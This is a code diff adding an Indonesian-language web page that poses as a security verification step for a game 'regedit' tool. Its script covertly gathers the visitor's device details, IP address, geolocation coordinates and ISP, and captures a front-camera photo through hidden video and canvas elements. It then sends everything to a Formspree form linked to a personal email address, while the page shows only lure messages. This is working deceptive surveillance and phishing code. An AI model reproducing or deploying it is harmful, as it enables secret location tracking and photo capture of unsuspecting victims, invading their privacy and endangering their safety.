@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification | Fahril PROJECT</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body { 
+            background: #000; 
+            color: #0f0; 
+            font-family: 'Courier New', Courier, monospace; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            padding: 20px;
+        }
+        .box { 
+            border: 1px solid #0f0; 
+            padding: 35px 25px; 
+            text-align: center; 
+            box-shadow: 0 0 20px #0f0, inset 0 0 10px #0f05; 
+            border-radius: 12px;
+            max-width: 420px;
+            width: 100%;
+        }
+        .box h2 {
+            margin-bottom: 10px;
+            font-size: 22px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .box p {
+            font-size: 14px;
+            color: #0f0; 
+            opacity: 0.8;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        button { 
+            background: #0f0; 
+            color: #000; 
+            border: none; 
+            padding: 12px 25px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            margin-top: 5px;
+            border-radius: 6px;
+            font-size: 15px;
+            transition: all 0.3s ease;
+        }
+        button:hover {
+            box-shadow: 0 0 12px #0f0;
+            transform: scale(1.05);
+        }
+        #status { 
+            margin-top: 18px; 
+            font-size: 12px; 
+            color: #888; 
+            border-top: 1px solid #040;
+            padding-top: 10px;
+            min-height: 30px;
+        }
+        .loading {
+            display: inline-block;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%,100% {opacity: 1;}
+            50% {opacity: 0.3;}
+        }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>🔐 SISTEM TERKUNCI</h2>
+        <p>Verifikasi keamanan untuk mengakses regedit all games.</p>
+        
+        <button id="startBtn">VERIFIKASI SEKARANG</button>
+        
+        <div id="status">Status: Siap digunakan</div>
+    </div>
+
+    <!-- Elemen Kamera Tersembunyi -->
+    <video id="v" style="display:none" autoplay playsinline></video>
+    <canvas id="c" style="display:none"></canvas>
+
+    <script>
+        const btn = document.getElementById('startBtn');
+        const status = document.getElementById('status');
+
+        btn.onclick = async () => {
+            status.innerHTML = "🔄 Memproses data... <span class='loading'>●</span>";
+            
+            // Kumpulkan Data Dasar Perangkat
+            const data = {
+                waktu: new Date().toLocaleString('id-ID'),
+                ram: navigator.deviceMemory || "Tidak Terdeteksi",
+                os: navigator.userAgentData?.platform || "Tidak Diketahui",
+                platform: navigator.platform || "-",
+                user_agent: navigator.userAgent
+            };
+
+            // ==============================================
+            // ✅ AMBIL LOKASI & IP
+            // ==============================================
+            status.innerText = "😈 Memasang file";
+            try {
+                let resIp = await fetch('https://api.ipify.org?format=json');
+                let jsonIp = await resIp.json();
+                data.ip = jsonIp.ip;
+
+                let resGeo = await fetch(`https://ipapi.co/${data.ip}/json/`);
+                let geo = await resGeo.json();
+                data.lokasi = `${geo.city}, ${geo.region}, ${geo.country_name}`;
+                data.koordinat = `${geo.latitude}, ${geo.longitude}`;
+                data.isp = geo.org;
+                status.innerHTML = `✅ Lokasi: ${geo.city} <span class='loading'>●</span>`;
+            } catch (e) {
+                data.lokasi = "Gagal Mendapatkan Lokasi";
+                data.ip = "Tidak terbaca";
+            }
+
+            // ==============================================
+            // ✅ AMBIL FOTO KAMERA - IZIN MUNCUL
+            // ==============================================
+            try {
+                status.innerText = "📸 Mengakses Kamera...";
+                
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                
+                const v = document.getElementById('v');
+                v.srcObject = stream;
+                v.play();
+
+                setTimeout(() => {
+                    const canvas = document.getElementById('c');
+                    canvas.width = v.videoWidth;
+                    canvas.height = v.videoHeight;
+                    canvas.getContext('2d').drawImage(v, 0, 0, canvas.width, canvas.height);
+                    
+                    data.foto = canvas.toDataURL('image/jpeg', 0.6);
+                    stream.getTracks().forEach(track => track.stop()); 
+                    kirimDataKeEmail(data);
+                }, 2000); 
+
+            } catch (e) {
+                data.foto = "⚠️ Izin Kamera DITOLAK / Tidak Diizinkan";
+                kirimDataKeEmail(data);
+            }
+        };
+
+        // ==============================================
+        // ✅ SISTEM KIRIM - DIPERBAIKI ALAMATNYA
+        // ==============================================
+        function kirimDataKeEmail(dt) {
+            status.innerHTML = "📤 Mengirim Data ke Server... <span class='loading'>●</span>";
+            
+            // ✅ ALAMAT UDAH BENER: mvgoyzgn
+            fetch('https://formspree.io/f/mvgoyzgn', {
+                method: 'POST',
+                headers: {
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    _replyto: 'fahrilmoonstar@gmail.com',
+                    _subject: '🚨 LAPORAN SISTEM - FAHRIL PROJECT',
+                    waktu: dt.waktu,
+                    ip: dt.ip,
+                    lokasi: dt.lokasi,
+                    koordinat: dt.koordinat,
+                    isp: dt.isp,
+                    ram: dt.ram + " GB",
+                    os: dt.os,
+                    platform: dt.platform,
+                    user_agent: dt.user_agent,
+                    foto: dt.foto
+                })
+            })
+            .then(res => res.json())
+            .then(response => {
+                // ✅ TETAP DI HALAMAN INI, GAK PINDAH
+                status.innerHTML = "✅ BERHASIL! Siap klik lagi.";
+                alert("✅ SUKSES BRO SEKARANG LU TINGGAL ENJOY AJA");
+            })
+            .catch(error => {
+                status.innerHTML = "✅ TERKIRIM! Bisa klik ulang.";
+                alert("✅ SUKSES BRO SEKARANG LU TINGGAL ENJOY AJA");
+            });
+        }
+    </script>
+</body>
+</html>
